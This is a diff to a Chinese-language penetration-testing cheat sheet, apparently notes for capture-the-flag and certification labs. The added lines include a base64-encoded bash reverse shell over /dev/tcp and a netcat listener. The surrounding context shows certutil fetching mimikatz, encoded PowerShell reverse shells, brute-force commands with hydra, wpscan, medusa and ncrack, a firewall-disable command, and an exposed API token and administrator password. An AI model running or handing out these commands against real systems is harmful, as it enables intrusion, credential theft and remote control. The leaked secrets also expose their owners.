@@ -32,8 +32,10 @@ certutil.exe -urlcache -split -f http://10.10.14.8/mimikatz_trunk.exe mimikatz_t
 8.嘗試將reverse.ps1轉馬成base64
 9.cat Invoke-PowerShellTcp.ps1 | iconv -t UTF-16LE |base64 -w0
   powershell -enc 將複製的base64code貼上
-
-
+10. echo -n "bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'" |base64 -w 0
+    echo -n YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxJw== |base64 -d |bash
+    中間有+號,若還失敗的話上cyberchief調整增加空格,避免掉+號
+11. 使用rlwrap nc -vnlp 443 (windows)
 
 ###windows登入連線指令
 evil-winrm -u 'Administrator' -p  'kidvscat_admin_@123' -i atom.htb
@@ -85,7 +87,9 @@ SITE CPTO /var/tmp/id_rsa
 
 
 ###掃出來的每個port都要仔細看,查詢是什麼用途
-###根據port直接pycharm搜紀錄
+1. 網頁http直接訪問
+2. curl http://192.168.120.144:27015
+3. curl -X POST http://192.168.120.144:27015
 
 
 ###數據庫服務嘗試弱密碼登入及暴力破解
@@ -130,6 +134,7 @@ hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.10.63.174 http-post-form
 wpscan --url whoisrobot.com --usernames Elliot --passwords /home/kali/timmy/TryHackMe/Mr_Robot/fsocity.dic --max-threads 50
 wpscan --url sunset-midnight --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50 --max-threads 50
 wpscan --url http://10.10.222.171/ --disable-tls-checks --enumerate u --api-token yebWdQNmyXU7oApKQatIaLPe5NL0EkYTjuSunpp5DIU
+wpscan --url http://internal.thm/blog/ --disable-tls-checks --enumerate vp --api-token yebWdQNmyXU7oApKQatIaLPe5NL0EkYTjuSunpp5DIU
 medusa -h 10.11.1.22 -u tris -P /usr/share/wordlists/rockyou.txt -M http-m DIR:/admin
 ncrack -u adam -P /usr/share/wordlists/rockyou.txt -p 3389 10.11.1.22
 
@@ -191,3 +196,7 @@ netsh firewall set opmode mode=disable
 
 ###查看samba 139 port版本
 ###nc 檢查110 25服務是否為JAMES POP3 Server
+
+
+type proof.txt && whoami && hostname && ipconfig
+cat proof.txt && whoami && hostname && ip addr
